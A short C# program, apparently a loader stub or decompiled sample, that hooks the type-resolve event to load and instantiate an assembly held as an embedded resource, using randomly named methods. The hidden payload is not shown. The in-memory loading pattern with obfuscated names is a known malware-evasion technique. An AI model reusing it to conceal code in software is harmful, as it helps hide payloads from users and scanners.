using System;
using System.Reflection;
using TooMuchToHandle;

public class Class1
{
	[STAThread]
	public static void Main()
	{
		AppDomain.CurrentDomain.TypeResolve += HandleTypeResolve;
		bl64nhah3();
	}

	public static DateTime bl64nhah3()
	{
		Activator.CreateInstance(Type.GetType("Talic", throwOnError: true));
		return DateTime.UtcNow;
	}

	private static Assembly HandleTypeResolve(object sender, ResolveEventArgs e)
	{
		return AppDomain.CurrentDomain.Load(yl5kgyvlr5uga4rj());
	}

	public static byte[] yl5kgyvlr5uga4rj()
	{
		object helperDll_dll = Resources.HelperDll_dll;
		return (byte[])helperDll_dll;
	}
}
